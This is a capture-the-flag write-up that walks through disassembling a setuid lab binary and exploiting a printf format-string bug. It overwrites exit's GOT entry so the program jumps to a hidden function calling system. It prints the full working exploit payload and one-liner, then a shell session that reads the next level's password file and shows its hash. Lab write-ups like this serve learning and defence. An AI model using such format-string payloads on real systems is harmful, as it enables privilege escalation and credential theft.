What do we have?

	$ ll
	total 17
	dr-xr-x---+ 1 level5 level5   80 Mar  6  2016 ./
	dr-x--x--x  1 root   root    340 Sep 23  2015 ../
	-rw-r--r--  1 level5 level5  220 Apr  3  2012 .bash_logout
	-rw-r--r--  1 level5 level5 3530 Sep 23  2015 .bashrc
	-rwsr-s---+ 1 level6 users  5385 Mar  6  2016 level5*
	-rw-r--r--+ 1 level5 level5   65 Sep 23  2015 .pass
	-rw-r--r--  1 level5 level5  675 Apr  3  2012 .profile

A `level5` binary. Let's check the assembly:

	$ gdb ./level5
	[...]
	(gdb) b main
	[...]
	(gdb) r
	[...]
	(gdb) disas
	Dump of assembler code for function main:
	0x08048504 <+0>:	push   %ebp
	0x08048505 <+1>:	mov    %esp,%ebp
	=> 0x08048507 <+3>:	and    $0xfffffff0,%esp
	0x0804850a <+6>:	call   0x80484c2 <n>
	0x0804850f <+11>:	leave  
	0x08048510 <+12>:	ret    
	End of assembler dump.

It simply calls a function `n` (+6). If we check its assembly:

	(gdb) disas n
	Dump of assembler code for function n:
	0x080484c2 <+0>:	push   %ebp
	0x080484c3 <+1>:	mov    %esp,%ebp
	0x080484c5 <+3>:	sub    $0x218,%esp
	0x080484cb <+9>:	mov    0x8049848,%eax
	0x080484d0 <+14>:	mov    %eax,0x8(%esp)
	0x080484d4 <+18>:	movl   $0x200,0x4(%esp)
	0x080484dc <+26>:	lea    -0x208(%ebp),%eax
	0x080484e2 <+32>:	mov    %eax,(%esp)
	0x080484e5 <+35>:	call   0x80483a0 <fgets@plt>
	0x080484ea <+40>:	lea    -0x208(%ebp),%eax
	0x080484f0 <+46>:	mov    %eax,(%esp)
	0x080484f3 <+49>:	call   0x8048380 <printf@plt>
	0x080484f8 <+54>:	movl   $0x1,(%esp)
	0x080484ff <+61>:	call   0x80483d0 <exit@plt>

Buffer of 536 (+3), into `fgets` (+9 to +35), into `printf` (+40 to +49). This time, there is no variable though, so it's time for shellcode again... or maybe not. We struggled for hours to make a shellcode injection work, and while we think we were close, it just didn't. While going back the previous exercises to be sure we didn't misunderstood something, we realized we didn't checked `info functions` in `gdb`, and saw a function `o` not called in the code...

	(gdb) info functions
	All defined functions:

	Non-debugging symbols:
	[...]
	0x080484a4  o
	0x080484c2  n
	0x08048504  main

	(gdb) disas o
	Dump of assembler code for function o:
	0x080484a4 <+0>:	push   %ebp
	0x080484a5 <+1>:	mov    %esp,%ebp
	0x080484a7 <+3>:	sub    $0x18,%esp
	0x080484aa <+6>:	movl   $0x80485f0,(%esp)
	0x080484b1 <+13>:	call   0x80483b0 <system@plt>
	0x080484b6 <+18>:	movl   $0x1,(%esp)
	0x080484bd <+25>:	call   0x8048390 <_exit@plt>
	End of assembler dump.

Damn. No need for shellcode, in reality. It doesn't really change what we were doing though, so we searched how could we do something a little bit different, and stumbled upon the concept of `Global Offset Table`, and its popular use in such CTF (https://systemoverlord.com/2017/03/19/got-and-plt-for-pwning.html).

First, let's look where `exit`, called after the `printf` we'll use, is in the memory.

	(gdb) disas 0x80483d0
	Dump of assembler code for function exit@plt:
	0x080483d0 <+0>:	jmp    *0x8049838
	0x080483d6 <+6>:	push   $0x28
	0x080483db <+11>:	jmp    0x8048370
	End of assembler dump.

	x/x 0x8049838
	0x8049838 <exit@got.plt>:	0x080483d6

So the real address of `exit` is `0x080483d6`, but that's something that can be rewrote. We want the address of `o`. `0x080484a4` is 134513828 in decimal, so that's way too many characters to write. To avoid that, we'll split the address `0x8049838` into two halves (`0x8049838` and `0x804983a`), for two `%hn` prints.

	\x38\x98\x04\x08\x3a\x98\x04\x08

`0x84a4` (lower half of `0x080484a4`) is 33956 in decimal. `0x0804` (upper half) is 2052. We have the 8 bytes of the address to overwrite in the buffer, so 33956 - 8 = 33948. For the upper half, we need to overflow (max 65536). 65536 - 33956 = 31580, + 2052 = 33632.

	%33948c%4$hn%33632c%5$hn

And...!

	$ (printf '%b' '\x38\x98\x04\x08\x3a\x98\x04\x08'; printf '%s' '%33948c%4$hn%33632c%5$hn'; cat) | ./level5
	[...]�
	whoami
	level6
	cat /home/user/level6/.pass
	d3b7bf1025225bd715fa8ccb54ef06ca70b9125ac855aeab4878217177f41a31

It's extremely similar to what we were doing, trying to overwrite the `eip` of `printf` with our buffer + X for a shellcode, but somehow, it worked much better there. 'guess we did something wrong, or we missed something (possibly because of the intermediary step of the GOT/PLT).
